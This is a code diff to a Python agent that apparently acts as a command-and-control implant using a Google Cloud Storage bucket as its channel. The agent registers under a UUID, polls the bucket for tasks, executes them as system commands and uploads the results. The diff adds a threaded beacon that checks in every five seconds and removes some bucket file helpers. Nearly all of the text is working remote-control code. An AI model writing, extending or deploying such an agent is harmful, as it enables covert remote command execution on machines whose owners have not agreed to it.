@@ -9,6 +9,7 @@ import uuid
 from time import sleep
 import shlex
 import subprocess
+import threading
 
 info = {
     "type": "service_account",
@@ -23,6 +24,7 @@ info = {
     "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/<SERVICE_ACCOUNT_EMAIL>",
     "universe_domain": "googleapis.com"
 }
+
 credentials = service_account.Credentials.from_service_account_info(info)
 
 class GCPAgent:
@@ -33,6 +35,8 @@ class GCPAgent:
         self.agent_id = str(uuid.uuid4())
         self.task_key_name = f"{self.agent_id}:TaskForYou"
         self.resp_key_name = f"{self.agent_id}:RespForYou"
+        self.check_in_interval = 5  # seconds
+        self.stop_flag = threading.Event()
 
     def encode(self, data):
         data = base64.b64encode(data.encode()).decode()
@@ -66,11 +70,16 @@ class GCPAgent:
                 print(f"Error receiving data: {e}")
                 sleep(5)
 
-    def register_agent(self):
+    def check_in(self):
         key_name = f"AGENT:{self.agent_id}"
         blob = self.bucket.blob(key_name)
         blob.upload_from_string("")
-        print(f"[+] Registering new agent {key_name}")
+        print(f"[+] Agent {self.agent_id[:8]} checked in")
+
+    def periodic_check_in(self):
+        while not self.stop_flag.is_set():
+            self.check_in()
+            sleep(self.check_in_interval)
 
     def execute_task(self, task):
         try:
@@ -89,58 +98,27 @@ class GCPAgent:
         except Exception as e:
             return f"Error executing command: {task}\nError: {str(e)}"
 
+    
+
     def run(self):
-        self.register_agent()
+        self.check_in()  # Initial check-in
+        check_in_thread = threading.Thread(target=self.periodic_check_in)
+        check_in_thread.start()
+
         print("Waiting for tasks...")
-        while True:
-            try:
+        try:
+            while True:
                 tasks = self.recv_data()
                 for task in tasks:
                     print(f"Received task: {task}")
                     result = self.execute_task(task)
                     print(f"Processed task: {task}")
                     self.send_data(result)
-            except KeyboardInterrupt:
-                print("Caught escape signal")
-                break
-
-    def get_object_content(self, object_name):
-        blob = self.bucket.blob(object_name)
-        return blob.download_as_text()
-
-    def list_directory(self, directory_prefix):
-        blobs = self.bucket.list_blobs(prefix=directory_prefix, delimiter='/')
-        
-        files = []
-        subdirs = set()
-        
-        for blob in blobs:
-            if blob.name.endswith('/'):
-                subdirs.add(blob.name)
-            else:
-                files.append(blob.name)
-        
-        subdirs.update(blobs.prefixes)
-        
-        return {
-            'files': files,
-            'subdirectories': list(subdirs)
-        }
-
-    def create_folder(self, folder_name):
-        if not folder_name.endswith('/'):
-            folder_name += '/'
-        
-        blob = self.bucket.blob(folder_name)
-        blob.upload_from_string('')  
-
-    def create_object(self, file_path, content):
-        blob = self.bucket.blob(file_path)
-        blob.upload_from_string(content)
-
-    def delete_object(self, object_name):
-        blob = self.bucket.blob(object_name)
-        blob.delete()
+        except KeyboardInterrupt:
+            print("Caught escape signal")
+        finally:
+            self.stop_flag.set()
+            check_in_thread.join()
 
 bucket_name = '<YOUR BUCKET HERE>'
 
